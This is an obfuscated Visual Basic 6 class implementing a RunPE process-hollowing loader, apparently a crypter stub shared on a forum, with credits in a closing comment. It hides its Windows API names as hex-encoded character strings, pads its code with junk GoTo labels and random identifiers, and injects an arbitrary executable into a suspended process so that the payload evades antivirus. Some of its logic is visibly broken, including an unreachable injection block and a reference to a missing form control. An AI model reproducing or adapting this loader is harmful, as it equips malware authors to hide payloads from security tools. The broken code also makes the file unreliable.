VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "Class1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Private Const IYTUd79mv       As Long = &H5A4D&
Private Const SDTdRa0Yx        As Long = &H4550&
Private Const zuWBGHFF3           As Long = &H40
Private Const JUPbgcLdS           As Long = &HF8
Private Const hgric4Usb     As Long = &H28
Private Const OpwLdsiMl As Long = &H28
Private Const UNlGVVpms             As String = "8B4C240851<XR4kG6wJp>E8<MvdW4RpKH>5989016631C0C3"
Private Const Jp8bNnjDF          As String = "8B5C240854B830000000648B008B400C8B401C8B008B400889035C31C0C3"
Private Const XR4kG6wJp                    As String = "<XR4kG6wJp>"
Private Const MvdW4RpKH                    As String = "<MvdW4RpKH>"
Private Const sqOoFf0cp              As Long = &H10007
Private Const JaS8zlLp8          As Long = &H4
Private Const rwpC0LVBJ                As Long = &H1000
Private Const bDDoLSkl9               As Long = &H2000
Private Const gnqyyL76b    As Long = &H40
Private Type MXcGtxwKs
cb                          As Long
lpReserved                  As Long
lpDesktop                   As Long
lpTitle                     As Long
dwX                         As Long
dwY                         As Long
dwXSize                     As Long
dwYSize                     As Long
dwXCountChars               As Long
dwYCountChars               As Long
dwFillAttribute             As Long
dwFlags                     As Long
wShowWindow                 As Integer
cbReserved2                 As Integer
lpReserved2                 As Long
hStdInput                   As Long
hStdOutput                  As Long
hStdError                   As Long
End Type
Private Type mslFWRwiW
hProcess                    As Long
hThread                     As Long
dwProcessID                 As Long
dwThreadID                  As Long
End Type
Private Type pkC1oaanr
ControlWord                 As Long
StatusWord                  As Long
TagWord                     As Long
ErrorOffset                 As Long
ErrorSelector               As Long
DataOffset                  As Long
DataSelector                As Long
RegisterArea(1 To 80)       As Byte
Cr0NpxState                 As Long
End Type
Private Type g5GBr5UxZ
ContextFlags                As Long
Dr0                         As Long
Dr1                         As Long
Dr2                         As Long
Dr3                         As Long
Dr6                         As Long
Dr7                         As Long
FloatSave                   As pkC1oaanr
SegGs                       As Long
SegFs                       As Long
SegEs                       As Long
SegDs                       As Long
Edi                         As Long
Esi                         As Long
Ebx                         As Long
Edx                         As Long
Ecx                         As Long
Eax                         As Long
Ebp                         As Long
Eip                         As Long
SegCs                       As Long
EFlags                      As Long
Esp                         As Long
SegSs                       As Long
End Type
Private Type Y2VLEZubs
e_magic                     As Integer
e_cblp                      As Integer
e_cp                        As Integer
e_crlc                      As Integer
e_cparhdr                   As Integer
e_minalloc                  As Integer
e_maxalloc                  As Integer
e_ss                        As Integer
e_sp                        As Integer
e_csum                      As Integer
e_ip                        As Integer
e_cs                        As Integer
e_lfarlc                    As Integer
e_ovno                      As Integer
e_res(0 To 3)               As Integer
e_oemid                     As Integer
e_oeminfo                   As Integer
e_res2(0 To 9)              As Integer
e_lfanew                    As Long
End Type
Private Type XlgrkOG2f
Machine                     As Integer
NumberOfSections            As Integer
TimeDateStamp               As Long
PointerToSymbolTable        As Long
NumberOfSymbols             As Long
SizeOfOptionalHeader        As Integer
Characteristics             As Integer
End Type
Private Type C4oSubtCw
VirtualAddress              As Long
kTJGVD60L                        As Long
End Type
Private Type mK2ULKkqi
Magic                       As Integer
MajorLinkerVersion          As Byte
MinorLinkerVersion          As Byte
SizeOfCode                  As Long
SizeOfInitializedData       As Long
SizeOfUnitializedData       As Long
AddressOfEntryPoint         As Long
BaseOfCode                  As Long
BaseOfData                  As Long
ImageBase                   As Long
SectionAlignment            As Long
FileAlignment               As Long
MajorOperatingSystemVersion As Integer
MinorOperatingSystemVersion As Integer
MajorImageVersion           As Integer
MinorImageVersion           As Integer
MajorSubsystemVersion       As Integer
MinorSubsystemVersion       As Integer
W32VersionValue             As Long
SizeOfImage                 As Long
SizeOfHeaders               As Long
CheckSum                    As Long
SubSystem                   As Integer
DllCharacteristics          As Integer
SizeOfStackReserve          As Long
SizeOfStackCommit           As Long
SizeOfHeapReserve           As Long
SizeOfHeapCommit            As Long
LoaderFlags                 As Long
NumberOfRvaAndSizes         As Long
DataDirectory(0 To 15)      As C4oSubtCw
End Type
Private Type qfZUBikzN
Signature                   As Long
FileHeader                  As XlgrkOG2f
OptionalHeader              As mK2ULKkqi
End Type
Private Type LiRBdkNX0
Characteristics              As Long
TimeDateStamp                As Long
MajorVersion                 As Integer
MinorVersion                 As Integer
lpName                       As Long
Base                         As Long
NumberOfFunctions            As Long
NumberOfNames                As Long
lpAddressOfFunctions         As Long
lpAddressOfNames             As Long
lpAddressOfNameOrdinals      As Long
End Type
Private Type SRS65LJ03
SecName                     As String * 8
VirtualSize                 As Long
VirtualAddress              As Long
SizeOfRawData               As Long
PointerToRawData            As Long
PointerToRelocations        As Long
PointerToLinenumbers        As Long
NumberOfRelocations         As Integer
NumberOfLinenumbers         As Integer
Characteristics             As Long
End Type

Private Declare Sub CopyBytes Lib "kernel32" Alias "RtlMoveMemory" (yLg9YYF0t As Any, H1CR11Ug8 As Any, ByVal hQPyAgBnV As Long)
Private c_lKrnl         As Long
Private c_lLoadLib      As Long
Private c_bInit         As Boolean
Private c_lVTE          As Long
Private c_lOldVTE       As Long
Private c_bvASM(&HFF)   As Byte
Public Function lD7fhqUD7() As Long
End Function
Public Function Q0jrmm30u(ByRef bvBuff() As Byte, Optional sHost As String, Optional ByRef hProc As Long) As Boolean
Dim i                       As Long
Dim tIMAGE_DOS_HEADER       As Y2VLEZubs
Dim tIMAGE_NT_HEADERS       As qfZUBikzN
Dim tIMAGE_SECTION_HEADER   As SRS65LJ03
Dim tSTARTUPINFO            As MXcGtxwKs
Dim tPROCESS_INFORMATION    As mslFWRwiW
Dim tCONTEXT                As g5GBr5UxZ
Dim lKernel                 As Long
Dim lNTDll                  As Long
Dim lMod                    As Long
If Not c_bInit Then
GoTo kCOCAtMJfPagcnFGbc
kCOCAtMJfPagcnFGbc:
GoTo SSFrToCQwPBFeTQKcZ
SSFrToCQwPBFeTQKcZ:
GoTo PlNtMwCbPNHZWsPntp
PlNtMwCbPNHZWsPntp:
GoTo rUYmvSfSFfCBdLcOSr
rUYmvSfSFfCBdLcOSr:
GoTo wDLBgopnsQXeIVUkor
wDLBgopnsQXeIVUkor:
Exit Function
Call CopyBytes(zuWBGHFF3, tIMAGE_DOS_HEADER, bvBuff(0))
If Not tIMAGE_DOS_HEADER.e_magic = IYTUd79mv Then
Exit Function
End If
Call CopyBytes(JUPbgcLdS, tIMAGE_NT_HEADERS, bvBuff(tIMAGE_DOS_HEADER.e_lfanew))
If Not tIMAGE_NT_HEADERS.Signature = SDTdRa0Yx Then
Exit Function
End If
GoTo vSqvsEIWrtDNHkBTnH
vSqvsEIWrtDNHkBTnH:
lKernel = YzRf0S3zz(suCID6cTB(Chr$(54) & Chr$(66) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(50) & Chr$(54) & Chr$(69) _
 & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(67) & Chr$(51) & Chr$(51) & Chr$(51) & Chr$(50)))                                                                                                'KPC
lNTDll = YzRf0S3zz(suCID6cTB(Chr$(54) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(54) & Chr$(52) & Chr$(54) & Chr$(67) _
 & Chr$(54) & Chr$(67)))                                                                                                    'KPC
If sHost = vbNullString Then
GoTo BqWffeiUNULLaehZwN
BqWffeiUNULLaehZwN:
sHost = Space(260)
lMod = AWw1ONbMA(lKernel, suCID6cTB(Chr$(52) & Chr$(55) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(52) & Chr$(52) _
 & Chr$(68) & Chr$(54) & Chr$(70) & Chr$(54) & Chr$(52) & Chr$(55) & Chr$(53) & Chr$(54) & Chr$(67) _
 & Chr$(54) & Chr$(53) & Chr$(52) & Chr$(54) & Chr$(54) & Chr$(57) & Chr$(54) & Chr$(67) & Chr$(54) _
 & Chr$(53) & Chr$(52) & Chr$(69) & Chr$(54) & Chr$(49) & Chr$(54) & Chr$(68) & Chr$(54) & Chr$(53) _
 & Chr$(53) & Chr$(55)))                                                                         'KPC
m2P0s5wEC lMod, App.hInstance, StrPtr(sHost), 260
End If
GoTo GpXauXbpAViVIjGEgO
GpXauXbpAViVIjGEgO:
With tIMAGE_NT_HEADERS.OptionalHeader
tSTARTUPINFO.cb = Len(tSTARTUPINFO)
lMod = AWw1ONbMA(lKernel, suCID6cTB(Chr$(52) & Chr$(51) & Chr$(55) & Chr$(50) & Chr$(54) & Chr$(53) & Chr$(54) _
 & Chr$(49) & Chr$(55) & Chr$(52) & Chr$(54) & Chr$(53) & Chr$(53) & Chr$(48) & Chr$(55) & Chr$(50) _
 & Chr$(54) & Chr$(70) & Chr$(54) & Chr$(51) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(51) & Chr$(55) _
 & Chr$(51) & Chr$(53) & Chr$(55)))                                                                             'KPC
m2P0s5wEC lMod, 0, StrPtr(sHost), 0, 0, 0, JaS8zlLp8, 0, 0, VarPtr(tSTARTUPINFO), VarPtr(tPROCESS_INFORMATION)
lMod = AWw1ONbMA(lNTDll, suCID6cTB(Chr$(52) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(53) & Chr$(53) & Chr$(54) _
 & Chr$(69) & Chr$(54) & Chr$(68) & Chr$(54) & Chr$(49) & Chr$(55) & Chr$(48) & Chr$(53) & Chr$(54) _
 & Chr$(54) & Chr$(57) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(55) & Chr$(52) & Chr$(70) & Chr$(54) _
 & Chr$(54) & Chr$(53) & Chr$(51) & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(51) & Chr$(55) & Chr$(52) _
 & Chr$(54) & Chr$(57) & Chr$(54) & Chr$(70) & Chr$(54) & Chr$(69)))                                                                        'KPC
m2P0s5wEC lMod, tPROCESS_INFORMATION.hProcess, .ImageBase
lMod = AWw1ONbMA(lKernel, suCID6cTB(Chr$(53) & Chr$(54) & Chr$(54) & Chr$(57) & Chr$(55) & Chr$(50) & Chr$(55) _
 & Chr$(52) & Chr$(55) & Chr$(53) & Chr$(54) & Chr$(49) & Chr$(54) & Chr$(67) & Chr$(52) & Chr$(49) _
 & Chr$(54) & Chr$(67) & Chr$(54) & Chr$(67) & Chr$(54) & Chr$(70) & Chr$(54) & Chr$(51) & Chr$(52) _
 & Chr$(53) & Chr$(55) & Chr$(56)))                                                                             'KPC
m2P0s5wEC lMod, tPROCESS_INFORMATION.hProcess, .ImageBase, .SizeOfImage, rwpC0LVBJ Or bDDoLSkl9, gnqyyL76b
GoTo fRVuVgaspNiHyHYmIy
fRVuVgaspNiHyHYmIy:
lMod = AWw1ONbMA(lNTDll, suCID6cTB(Chr$(52) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(53) & Chr$(55) & Chr$(55) _
 & Chr$(50) & Chr$(54) & Chr$(57) & Chr$(55) & Chr$(52) & Chr$(54) & Chr$(53) & Chr$(53) & Chr$(54) _
 & Chr$(54) & Chr$(57) & Chr$(55) & Chr$(50) & Chr$(55) & Chr$(52) & Chr$(55) & Chr$(53) & Chr$(54) _
 & Chr$(49) & Chr$(54) & Chr$(67) & Chr$(52) & Chr$(68) & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(68) _
 & Chr$(54) & Chr$(70) & Chr$(55) & Chr$(50) & Chr$(55) & Chr$(57)))                                                                        'KPC
m2P0s5wEC lMod, tPROCESS_INFORMATION.hProcess, .ImageBase, VarPtr(bvBuff(0)), .SizeOfHeaders, 0
For i = 0 To tIMAGE_NT_HEADERS.FileHeader.NumberOfSections - 1
CopyBytes Len(tIMAGE_SECTION_HEADER), tIMAGE_SECTION_HEADER, bvBuff(tIMAGE_DOS_HEADER.e_lfanew + JUPbgcLdS + OpwLdsiMl * i)
GoTo PcbruwpOdWGoqLnrGD
PcbruwpOdWGoqLnrGD:
m2P0s5wEC lMod, tPROCESS_INFORMATION.hProcess, .ImageBase + tIMAGE_SECTION_HEADER.VirtualAddress, VarPtr(bvBuff(tIMAGE_SECTION_HEADER.PointerToRawData)), tIMAGE_SECTION_HEADER.SizeOfRawData, 0
Next i
GoTo lYYAIUvQyUlMlvqJsP
lYYAIUvQyUlMlvqJsP:
tCONTEXT.ContextFlags = sqOoFf0cp
lMod = AWw1ONbMA(lNTDll, suCID6cTB(Chr$(52) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(52) & Chr$(55) & Chr$(54) _
 & Chr$(53) & Chr$(55) & Chr$(52) & Chr$(52) & Chr$(51) & Chr$(54) & Chr$(70) & Chr$(54) & Chr$(69) _
 & Chr$(55) & Chr$(52) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(56) & Chr$(55) & Chr$(52) & Chr$(53) _
 & Chr$(52) & Chr$(54) & Chr$(56) & Chr$(55) & Chr$(50) & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(49) _
 & Chr$(54) & Chr$(52)))                                                                          'KPC
m2P0s5wEC lMod, tPROCESS_INFORMATION.hThread, VarPtr(tCONTEXT)
lMod = AWw1ONbMA(lNTDll, suCID6cTB(Chr$(52) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(53) & Chr$(55) & Chr$(55) _
 & Chr$(50) & Chr$(54) & Chr$(57) & Chr$(55) & Chr$(52) & Chr$(54) & Chr$(53) & Chr$(53) & Chr$(54) _
 & Chr$(54) & Chr$(57) & Chr$(55) & Chr$(50) & Chr$(55) & Chr$(52) & Chr$(55) & Chr$(53) & Chr$(54) _
 & Chr$(49) & Chr$(54) & Chr$(67) & Chr$(52) & Chr$(68) & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(68) _
 & Chr$(54) & Chr$(70) & Chr$(55) & Chr$(50) & Chr$(55) & Chr$(57)))                                                                        'KPC
m2P0s5wEC lMod, tPROCESS_INFORMATION.hProcess, tCONTEXT.Ebx + 8, VarPtr(.ImageBase), 4, 0
tCONTEXT.Eax = .ImageBase + .AddressOfEntryPoint
lMod = AWw1ONbMA(lNTDll, suCID6cTB(Chr$(52) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(53) & Chr$(51) & Chr$(54) _
 & Chr$(53) & Chr$(55) & Chr$(52) & Chr$(52) & Chr$(51) & Chr$(54) & Chr$(70) & Chr$(54) & Chr$(69) _
 & Chr$(55) & Chr$(52) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(56) & Chr$(55) & Chr$(52) & Chr$(53) _
 & Chr$(52) & Chr$(54) & Chr$(56) & Chr$(55) & Chr$(50) & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(49) _
 & Chr$(54) & Chr$(52)))                                                                          'KPC
m2P0s5wEC lMod, tPROCESS_INFORMATION.hThread, VarPtr(tCONTEXT)
lMod = AWw1ONbMA(lNTDll, suCID6cTB(Chr$(52) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(53) & Chr$(50) & Chr$(54) _
 & Chr$(53) & Chr$(55) & Chr$(51) & Chr$(55) & Chr$(53) & Chr$(54) & Chr$(68) & Chr$(54) & Chr$(53) _
 & Chr$(53) & Chr$(52) & Chr$(54) & Chr$(56) & Chr$(55) & Chr$(50) & Chr$(54) & Chr$(53) & Chr$(54) _
 & Chr$(49) & Chr$(54) & Chr$(52)))                                                                              'KPC
m2P0s5wEC lMod, tPROCESS_INFORMATION.hThread, 0
hProc = tPROCESS_INFORMATION.hProcess
GoTo OqKpNfFfqkDmJsDJFR
OqKpNfFfqkDmJsDJFR:
End With
Q0jrmm30u = True
End If
End Function
Public Function m2P0s5wEC(ByVal lMod As Long, ParamArray Params()) As Long
Dim lPtr        As Long
Dim i           As Long
Dim sData       As String
Dim sParams     As String
If lMod = 0 Then Exit Function
For i = UBound(Params) To 0 Step -1
GoTo qWffeiUNULLaehZwNG
qWffeiUNULLaehZwNG:
sParams = sParams & Chr$(54) & Chr$(56) & C8c6XUWOj(CLng(Params(i)))
Next
GoTo pXauXbpAViVIjGEgOf
pXauXbpAViVIjGEgOf:
lPtr = VarPtr(c_bvASM(0))
lPtr = lPtr + (UBound(Params) + 2) * 5
lPtr = lMod - lPtr - 5
sData = UNlGVVpms
sData = Replace(sData, XR4kG6wJp, sParams)
sData = Replace(sData, MvdW4RpKH, C8c6XUWOj(lPtr))
Call PutThunk(sData)
m2P0s5wEC = scVtPeoLf
End Function
Private Function C8c6XUWOj(ByVal lData As Long) As String
Dim bvTemp(3)   As Byte
Dim i           As Long
GoTo QMXoDLMWtoSTAHZhXD
QMXoDLMWtoSTAHZhXD:
CopyBytes &H4, bvTemp(0), lData
For i = 0 To 3
GoTo wvCmtBRsrIwBrRtYWF
wvCmtBRsrIwBrRtYWF:
C8c6XUWOj = C8c6XUWOj & Right(Chr$(48) & Hex(bvTemp(i)), 2)
Next
End Function
Private Sub PutThunk(ByVal sThunk As String)
Dim i   As Long
For i = 0 To Len(sThunk) - 1 Step 2
GoTo tpBETopAJEhvQkDwnT
tpBETopAJEhvQkDwnT:
c_bvASM((i / 2)) = CByte(Chr$(38) & Chr$(104) & Mid$(sThunk, i + 1, 2))
Next i
End Sub
Private Function scVtPeoLf() As Long
GoTo ZUwAgBGOEjssqyTahM
ZUwAgBGOEjssqyTahM:
CopyBytes &H4, c_lVTE, ByVal ObjPtr(Me)
c_lVTE = c_lVTE + &H1C
CopyBytes &H4, c_lOldVTE, ByVal c_lVTE
CopyBytes &H4, ByVal c_lVTE, VarPtr(c_bvASM(0))
scVtPeoLf = lD7fhqUD7
CopyBytes &H4, ByVal c_lVTE, c_lOldVTE
End Function
Public Function NrZKCeGDn(ByVal sLib As String, ByVal sProc As String) As Long
GoTo yHMJUlAIJSqkOQvDWe
yHMJUlAIJSqkOQvDWe:
NrZKCeGDn = Me.AWw1ONbMA(Me.YzRf0S3zz(sLib), sProc)
End Function
Public Function YzRf0S3zz(ByVal sLib As String) As Long
GoTo LvqJGcMXdZkCDYZjHn
LvqJGcMXdZkCDYZjHn:
YzRf0S3zz = m2P0s5wEC(c_lLoadLib, StrPtr(sLib & vbNullChar))
End Function
Public Property Get Initialized() As Boolean
GoTo oPlNtMwCbPNHZWsPnt
oPlNtMwCbPNHZWsPnt:
Initialized = c_bInit
End Property
Public Sub Class_Initialize()
GoTo cafRKRyIHXbeVuKDmU
cafRKRyIHXbeVuKDmU:
Call PutThunk(Jp8bNnjDF)
c_lKrnl = scVtPeoLf
If Not c_lKrnl = 0 Then
GoTo XrUYmvSfSFfCBdLcOS
XrUYmvSfSFfCBdLcOS:
c_lLoadLib = AWw1ONbMA(c_lKrnl, Chr$(76) & Chr$(111) & Chr$(97) & Chr$(100) & Chr$(76) & Chr$(105) & Chr$(98) _
 & Chr$(114) & Chr$(97) & Chr$(114) & Chr$(121) & Chr$(87))
If Not c_lLoadLib = 0 Then
GoTo rSdXpmJfEyrEVjFsCZ
rSdXpmJfEyrEVjFsCZ:
c_bInit = True
End If
End If
End Sub
Public Function AWw1ONbMA(ByVal lMod As Long, ByVal sProc As String) As Long
Dim tIMAGE_DOS_HEADER       As Y2VLEZubs
Dim tIMAGE_NT_HEADERS       As qfZUBikzN
Dim tIMAGE_EXPORT_DIRECTORY As LiRBdkNX0
Call CopyBytes(zuWBGHFF3, tIMAGE_DOS_HEADER, ByVal lMod)
If Not tIMAGE_DOS_HEADER.e_magic = IYTUd79mv Then
Exit Function
End If
Call CopyBytes(JUPbgcLdS, tIMAGE_NT_HEADERS, ByVal lMod + tIMAGE_DOS_HEADER.e_lfanew)
If Not tIMAGE_NT_HEADERS.Signature = SDTdRa0Yx Then
Exit Function
End If
Dim lVAddress   As Long
Dim lVSize      As Long
Dim lBase       As Long
GoTo VvFRtNsQiIitnGpMyH
VvFRtNsQiIitnGpMyH:
With tIMAGE_NT_HEADERS.OptionalHeader
lVAddress = lMod + .DataDirectory(0).VirtualAddress
lVSize = lVAddress + .DataDirectory(0).kTJGVD60L
lBase = .ImageBase
End With
Call CopyBytes(hgric4Usb, tIMAGE_EXPORT_DIRECTORY, ByVal lVAddress)
Dim i           As Long
Dim lFunctAdd   As Long
Dim lNameAdd    As Long
Dim lNumbAdd    As Long
GoTo qJGcMXdZkCDYZjHnRg
qJGcMXdZkCDYZjHnRg:
With tIMAGE_EXPORT_DIRECTORY
For i = 0 To .NumberOfNames - 1
GoTo NTmukQLMKPAtBeGqHL
NTmukQLMKPAtBeGqHL:
CopyBytes 4, lNameAdd, ByVal lBase + .lpAddressOfNames + i * 4
If bbLBIgZRt(lBase + lNameAdd) = sProc Then
GoTo NFeHlWSGbRIWgPPCoP
NFeHlWSGbRIWgPPCoP:
CopyBytes 2, lNumbAdd, ByVal lBase + .lpAddressOfNameOrdinals + i * 2
CopyBytes 4, lFunctAdd, ByVal lBase + .lpAddressOfFunctions + lNumbAdd * 4
AWw1ONbMA = lFunctAdd + lBase
If AWw1ONbMA >= lVAddress And _
AWw1ONbMA <= lVSize Then
GoTo ETopAJEhvQkDwnTbca
ETopAJEhvQkDwnTbca:
Call PPr5TBO4P(AWw1ONbMA, lMod, sProc)
If Not lMod = 0 Then
GoTo fRKRyIHXbeVuKDmUXr
fRKRyIHXbeVuKDmUXr:
AWw1ONbMA = AWw1ONbMA(lMod, sProc)
Else
GoTo RVjtOcPCcwaHYLPoPa
RVjtOcPCcwaHYLPoPa:
AWw1ONbMA = 0
End If
End If
Exit Function
End If
Next
End With
End Function
Private Function PPr5TBO4P( _
ByVal lAddress As Long, _
ByRef lLib As Long, _
ByRef sMod As String)
Dim sForward     As String
GoTo uJqIuYMKEWTpMkpmwB
uJqIuYMKEWTpMkpmwB:
sForward = bbLBIgZRt(lAddress)
If InStr(1, sForward, Chr$(46)) Then
GoTo QlmyGBetNgAujPYZXc
QlmyGBetNgAujPYZXc:
lLib = YzRf0S3zz(Split(sForward, Chr$(46))(0))
sMod = DL2fM7VYB(sForward, Chr$(46))(1)
End If
End Function
Private Function bbLBIgZRt( _
ByVal lAddress As Long) As String
Dim bChar       As Byte
Do
GoTo FGPmhLNtATbRvrsqyg
FGPmhLNtATbRvrsqyg:
CopyBytes 1, bChar, ByVal lAddress
lAddress = lAddress + 1
If bChar = 0 Then Exit Do
GoTo nuLllBqtlLnSQwmHwo
nuLllBqtlLnSQwmHwo:
bbLBIgZRt = bbLBIgZRt & Chr$(bChar)
Loop
End Function
Private Function suCID6cTB(ByVal sData As String) As String
Dim i       As Long
For i = 1 To Len(sData) Step 2
GoTo myGBetNgAujPYZXcNG
myGBetNgAujPYZXcNG:
suCID6cTB = suCID6cTB & Chr$(Val(Chr$(38) & Chr$(72) & Mid$(sData, i, 2)))
Next i
End Function
Public Function PlmDPnPOK(ByVal OnvN9MtEry As String) As String
Dim qOHPMMuJzh As String
Dim xE8KVQnQr6 As String
Dim orCPFJ0gUA As Long
For orCPFJ0gUA = 1 To Len(OnvN9MtEry) Step 2
GoTo LllBqtlLnSQwmHwoCM
LllBqtlLnSQwmHwoCM:
qOHPMMuJzh = Chr$(Val(FYfPjQfg0(")K", "3") & Mid$(OnvN9MtEry, orCPFJ0gUA, 2)))
xE8KVQnQr6 = xE8KVQnQr6 & qOHPMMuJzh
Next orCPFJ0gUA
GoTo yuiiKSeHaGdyIytnGD
yuiiKSeHaGdyIytnGD:
PlmDPnPOK = xE8KVQnQr6
End Function
Function DL2fM7VYB(Str As String, Del As String) As String()
Dim lRet As Long, nRet As Long, i As Integer
Dim lCont As Long, Cst As Long
Dim Splitted() As String
If Del = FYfPjQfg0(FYfPjQfg0("", "6"), "3") Or Str = FYfPjQfg0(FYfPjQfg0("", "6"), "3") Then Exit Function
If InStr(1, Str, Del) = 0 Then Exit Function
GoTo soBRgCpWRuvdwDLBgo
soBRgCpWRuvdwDLBgo:
Cst = Len(Del)
lRet = InStr(1, Str, Del)
Do While lRet <> 0
GoTo pnsQXeIVUkoriIXQAh
pnsQXeIVUkoriIXQAh:
    lRet = InStr(lRet + Cst, Str, Del)
    lCont = lCont + 1
Loop
ReDim Splitted(lCont)
GoTo CcnhAiGpAGCOetBDMj
CcnhAiGpAGCOetBDMj:
lRet = 1 - Cst
For i = 0 To UBound(Splitted) - 1
GoTo eIKqvQYNtoonsdkrIi
eIKqvQYNtoonsdkrIi:
    nRet = InStr(lRet + Cst, Text1.Text, Del)
    Splitted(i) = Mid(Str, lRet + Cst, nRet - lRet - Cst)
    lRet = nRet
Next i
GoTo hwnqiHkPNujEulJrrf
hwnqiHkPNujEulJrrf:
lRet = lRet - 1 + Cst
Splitted(lCont) = Right(Str, Len(Str) - lRet)
DL2fM7VYB = Splitted
End Function
Public Function FYfPjQfg0(strInput As String, second As Integer)
    Dim first As Integer
    For first = 1 To Len(strInput)
GoTo JHBTQmIhmiuwNijsDw
JHBTQmIhmiuwNijsDw:
        Mid(strInput, first, 1) = Chr(Asc(Mid(strInput, first, 1)) - second)
    Next first
GoTo bqKdvrgMVWUZKDKoCB
bqKdvrgMVWUZKDKoCB:
    FYfPjQfg0 = strInput
End Function

' Mod for SpK
' credits to cobein
' Use Q0jrmm30u to call.
' Any suggestions, problems feel free to PM me.

